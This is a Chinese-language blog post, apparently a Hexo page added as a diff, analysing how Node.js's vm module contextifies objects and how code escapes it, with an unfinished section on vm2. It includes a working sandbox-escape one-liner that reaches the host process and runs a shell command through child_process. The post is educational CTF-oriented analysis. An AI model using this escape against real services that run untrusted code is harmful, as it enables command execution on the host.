@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>vm2沙盒逃逸分析 - LionTree</title>
+  <link rel="icon" href="https://i.imgur.com/SrZt9VU.jpg" type="image/x-icon">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content=漏洞分析,nodejs>
+  
+  
+  
+    <link rel="alternate" href="/atom.xml " title="LionTree" type="application/atom+xml">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">LionTree</a>
+    <div class="subtitle"></div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/summary" class="menu-item-link">Summary</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/atom.xml" class="menu-item-link">RSS</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">vm2沙盒逃逸分析</h1>
+  </div>
+
+  <!-- 文章目录 -->
+  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#vm"><span class="toc-text">vm</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#代码示例"><span class="toc-text">代码示例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#contextify"><span class="toc-text">contextify</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#概念"><span class="toc-text">概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#具体实现"><span class="toc-text">具体实现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#沙盒逃逸"><span class="toc-text">沙盒逃逸</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#vm2"><span class="toc-text">vm2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#代码示例-1"><span class="toc-text">代码示例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vm2实现"><span class="toc-text">vm2实现</span></a></li></ol></li></ol>
+
+  <div class="post-content">
+    <p>上个月底写了一半给咕了..看到GKCTF有道题涉及到了vm，顺便放出来吧</p>
+<p>前段时间hfctf有一道vm2沙盒逃逸的题目，于是顺便研究下vm2的实现和沙盒逃逸的原理</p>
+<h1 id="vm"><a href="#vm" class="headerlink" title="vm"></a>vm</h1><p>vm2是基于nodejs的内置模块vm的，所以先看看vm</p>
+<h2 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h2><p>vm能够在一个新的V8虚拟环境中运行代码，看一个<a href="https://nodejs.org/api/vm.html#vm_vm_executing_javascript" target="_blank" rel="noopener">文档</a>上的例子</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">'vm'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> x = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> context = &#123; <span class="attr">x</span>: <span class="number">2</span> &#125;;</span><br><span class="line">vm.createContext(context); <span class="comment">// Contextify the object.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> code = <span class="string">'x += 40; var y = 17;'</span>;</span><br><span class="line"><span class="comment">// `x` and `y` are global variables in the context.</span></span><br><span class="line"><span class="comment">// Initially, x has the value 2 because that is the value of context.x.</span></span><br><span class="line">vm.runInContext(code, context);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(context.x); <span class="comment">// 42</span></span><br><span class="line"><span class="built_in">console</span>.log(context.y); <span class="comment">// 17</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(x); <span class="comment">// 1; y is not defined.</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="contextify"><a href="#contextify" class="headerlink" title="contextify"></a>contextify</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>vm中有一个很重要的概念<a href="https://nodejs.org/api/vm.html#vm_what_does_it_mean_to_contextify_an_object" target="_blank" rel="noopener">contextify</a>,大致意思是当<code>vm.createContext()</code>被调用时，指定的<code>contextObject</code>（示例代码中的<code>context</code>）会与一个新的V8实例联系在一起，这个过程称为<strong>contextifying the object</strong></p>
+<h3 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h3><p>经过测试可以发现，vm会将一个指定的对象作为新的环境的全局对象(相当于正常情况下的<code>global</code>对象)，这个对象拥有<code>context</code>的所有属性，同时还自动添加了一些内置的全局变量，比如<code>Object</code>和<code>Function</code>，这些属性不会被添加到<code>context</code>上</p>
+<p>在沙盒中可以用<code>this</code>访问该对象，手动给<code>this</code>添加的属性会被添加到<code>context</code>上</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">'vm'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> context = &#123;</span><br><span class="line">    animal: <span class="string">'cat'</span>,</span><br><span class="line">    count: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.Script(<span class="string">`this.test=123;this`</span>); <span class="comment">//手动给this添加属性，返回this</span></span><br><span class="line">vm.createContext(context);</span><br><span class="line"><span class="keyword">var</span> result = script.runInContext(context);</span><br><span class="line"><span class="built_in">console</span>.log(result == context); <span class="comment">//false,两者不是同一对象</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Reflect</span>.ownKeys(context)); <span class="comment">//[ 'animal', 'count', 'test' ]  手动给this添加的属性也会被添加到context上</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Reflect</span>.ownKeys(result)); <span class="comment">//自动添加的属性都是不可枚举属性，需要用Reflect.ownKeys取出，这些属性不会被添加到context上</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">[ 'animal',</span></span><br><span class="line"><span class="comment">  'count',</span></span><br><span class="line"><span class="comment">  'Object',</span></span><br><span class="line"><span class="comment">  'Function',</span></span><br><span class="line"><span class="comment">  'Array',</span></span><br><span class="line"><span class="comment">  'Number',</span></span><br><span class="line"><span class="comment">  'parseFloat',</span></span><br><span class="line"><span class="comment">  'parseInt',</span></span><br><span class="line"><span class="comment">  'Infinity',</span></span><br><span class="line"><span class="comment">  'NaN',</span></span><br><span class="line"><span class="comment">  'undefined',</span></span><br><span class="line"><span class="comment">  'Boolean',</span></span><br><span class="line"><span class="comment">  'String',</span></span><br><span class="line"><span class="comment">  'Symbol',</span></span><br><span class="line"><span class="comment">  'Date',</span></span><br><span class="line"><span class="comment">  'Promise',</span></span><br><span class="line"><span class="comment">  'RegExp',</span></span><br><span class="line"><span class="comment">  'Error',</span></span><br><span class="line"><span class="comment">  'EvalError',</span></span><br><span class="line"><span class="comment">  'RangeError',</span></span><br><span class="line"><span class="comment">  'ReferenceError',</span></span><br><span class="line"><span class="comment">  'SyntaxError',</span></span><br><span class="line"><span class="comment">  'TypeError',</span></span><br><span class="line"><span class="comment">  'URIError',</span></span><br><span class="line"><span class="comment">  'JSON',</span></span><br><span class="line"><span class="comment">  'Math',</span></span><br><span class="line"><span class="comment">  'console',</span></span><br><span class="line"><span class="comment">  'Intl',</span></span><br><span class="line"><span class="comment">  'ArrayBuffer',</span></span><br><span class="line"><span class="comment">  'Uint8Array',</span></span><br><span class="line"><span class="comment">  'Int8Array',</span></span><br><span class="line"><span class="comment">  'Uint16Array',</span></span><br><span class="line"><span class="comment">  'Int16Array',</span></span><br><span class="line"><span class="comment">  'Uint32Array',</span></span><br><span class="line"><span class="comment">  'Int32Array',</span></span><br><span class="line"><span class="comment">  'Float32Array',</span></span><br><span class="line"><span class="comment">  'Float64Array',</span></span><br><span class="line"><span class="comment">  'Uint8ClampedArray',</span></span><br><span class="line"><span class="comment">  'BigUint64Array',</span></span><br><span class="line"><span class="comment">  'BigInt64Array',</span></span><br><span class="line"><span class="comment">  'DataView',</span></span><br><span class="line"><span class="comment">  'Map',</span></span><br><span class="line"><span class="comment">  'Set',</span></span><br><span class="line"><span class="comment">  'WeakMap',</span></span><br><span class="line"><span class="comment">  'WeakSet',</span></span><br><span class="line"><span class="comment">  'Proxy',</span></span><br><span class="line"><span class="comment">  'Reflect',</span></span><br><span class="line"><span class="comment">  'decodeURI',</span></span><br><span class="line"><span class="comment">  'decodeURIComponent',</span></span><br><span class="line"><span class="comment">  'encodeURI',</span></span><br><span class="line"><span class="comment">  'encodeURIComponent',</span></span><br><span class="line"><span class="comment">  'escape',</span></span><br><span class="line"><span class="comment">  'unescape',</span></span><br><span class="line"><span class="comment">  'eval',</span></span><br><span class="line"><span class="comment">  'isFinite',</span></span><br><span class="line"><span class="comment">  'isNaN',</span></span><br><span class="line"><span class="comment">  'SharedArrayBuffer',</span></span><br><span class="line"><span class="comment">  'Atomics',</span></span><br><span class="line"><span class="comment">  'BigInt',</span></span><br><span class="line"><span class="comment">  'WebAssembly' ]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<p>这些添加的属性与<code>global</code>中的同名属性是不同的对象(内存中位置不同)</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">'vm'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> context = &#123;</span><br><span class="line">    animal: <span class="string">'cat'</span>,</span><br><span class="line">    count: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.Script(<span class="string">`this`</span>);</span><br><span class="line">vm.createContext(context);</span><br><span class="line"><span class="keyword">var</span> result = script.runInContext(context);</span><br><span class="line"><span class="built_in">console</span>.log(result.Function == <span class="built_in">Function</span>); <span class="comment">//false</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="沙盒逃逸"><a href="#沙盒逃逸" class="headerlink" title="沙盒逃逸"></a>沙盒逃逸</h2><p>虽然存在contextify，vm还是可以很轻松的逃逸出去，因为<code>this.__proto__</code>指向的是主环境的<code>Object.prototype</code></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">'vm'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> context = &#123;</span><br><span class="line">    animal: <span class="string">'cat'</span>,</span><br><span class="line">    count: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.Script(<span class="string">`this.constructor.constructor('return process')().mainModule.require('child_process').execSync('whoami').toString()`</span>);</span><br><span class="line">vm.createContext(context);</span><br><span class="line"><span class="keyword">var</span> result = script.runInContext(context);</span><br><span class="line"><span class="built_in">console</span>.log(result);</span><br></pre></td></tr></table></figure>
+<ul>
+<li>第一步<code>this.constructor.constructor</code>通过继承链最终拿到主环境的<code>Function</code></li>
+<li><code>this.constructor.constructor(&#39;return process&#39;)()</code>构造了一个函数并执行，拿到主环境的<code>process</code>变量</li>
+<li>通过<code>process.mainModule.require</code>导入<code>child_process</code>模块，命令执行 </li>
+</ul>
+<h1 id="vm2"><a href="#vm2" class="headerlink" title="vm2"></a>vm2</h1><h2 id="代码示例-1"><a href="#代码示例-1" class="headerlink" title="代码示例"></a>代码示例</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">new</span> VM().run(<span class="string">'this.constructor.constructor("return process")().exit()'</span>);</span><br><span class="line"><span class="comment">// Throws ReferenceError: process is not defined</span></span><br></pre></td></tr></table></figure>
+<p>可以看到vm沙盒逃逸的payload已经打不通了</p>
+<h2 id="vm2实现"><a href="#vm2实现" class="headerlink" title="vm2实现"></a>vm2实现</h2><p>这里只关注/lib/main.js 中的<code>VM</code>类和/lib/contextify.js</p>
+<p>具体的代码就不贴了，太多了也没法贴…简单说一下</p>
+<ul>
+<li>使用vm创建新的v8虚拟环境</li>
+<li>在执行用户代码前先在新的V8虚拟环境中运行/lib/contextify.js<ul>
+<li>将<code>this</code>的<code>__proto__</code>修改为新环境中的<code>Object.prototype</code>，这也是为什么vm的exp打不通了</li>
+<li>引入了<a href="https://es6.ruanyifeng.com/#docs/proxy#this-%E9%97%AE%E9%A2%98" target="_blank" rel="noopener">proxy</a>，分为两种:<ul>
+<li>Contextify</li>
+<li>Decontextify</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>发现vm2根本写不清楚…先咕了吧…</p>
+
+  </div>
+  <div class="post-meta">
+    <span class="post-time" style="color:#646060;font-size:13px">2020-04-29</span>
+  </div>
+
+  <div class="post-footer">
+    
+      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/nodejs/" rel="tag">nodejs</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a></li></ul>
+    
+
+    <a href="#top" class="top">Back to Top</a>
+  </div>
+</article>
+
+<!-- 评论插件 -->
+
+<footer>
+  2025
+  <span class="author">
+    LionTree
+  </span>
+</footer>
+
+
+    </div>
+  </body>
+</html>
